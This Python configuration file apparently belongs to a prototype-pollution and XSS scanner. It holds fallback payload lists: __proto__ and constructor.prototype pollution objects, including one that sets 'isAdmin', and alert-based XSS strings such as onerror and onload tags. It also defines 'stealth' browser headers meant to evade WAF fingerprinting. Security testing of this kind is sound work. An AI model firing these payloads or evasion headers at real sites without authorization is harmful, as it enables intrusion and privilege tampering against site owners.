from ppmap.utils import Colors

# ============================================================================
# CONFIGURATION
# ============================================================================
# Try to import comprehensive payloads
try:
    from utils.payloads import (
        CLIENT_SIDE_PP_PAYLOADS,
        SERVER_SIDE_PP_PAYLOADS,
        WAF_BYPASS_PAYLOADS,
        XSS_PAYLOADS as PAYLOAD_XSS_LIST,
        payload_count
    )
    PAYLOADS_AVAILABLE = True
except ImportError:
    PAYLOADS_AVAILABLE = False
    print(f"{Colors.WARNING}[!] Warning: utils/payloads not available, using fallback payloads{Colors.ENDC}")

CONFIG = {
    'timeout': 15,
    'max_workers': 3,
    'user_agents': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ],
    'jquery_payloads': [
        {"__proto__": {"polluted": True}},
        {"constructor": {"prototype": {"hacked": True}}},
        {"__proto__": {"isAdmin": True}},
        {"__proto__": {"debug": True}}
    ],
    'xss_payloads': [
        '<img src=x onerror="alert(\'XSS\')">', 
        '<svg onload="alert(\'XSS\')">',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<body onload="alert(\'XSS\')">',
        '<input onfocus="alert(\'XSS\')" autofocus>'
    ]
}

# Realistic browser headers to avoid WAF fingerprinting
STEALTH_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'Connection': 'keep-alive',
}

if PAYLOADS_AVAILABLE:
    # CLIENT_SIDE_PP_PAYLOADS is a dict of lists, flatten it
    try:
        all_pp = []
        for category, payloads in CLIENT_SIDE_PP_PAYLOADS.items():
            if isinstance(payloads, list):
                all_pp.extend(payloads)
        if all_pp:
            CONFIG['jquery_payloads'] = all_pp[:20]
    except Exception as e:
        logger.debug(f"Ignored error: {type(e).__name__} - {e}")
    
    # PAYLOAD_XSS_LIST should be a list
    if PAYLOAD_XSS_LIST and isinstance(PAYLOAD_XSS_LIST, list):
        CONFIG['xss_payloads'] = PAYLOAD_XSS_LIST

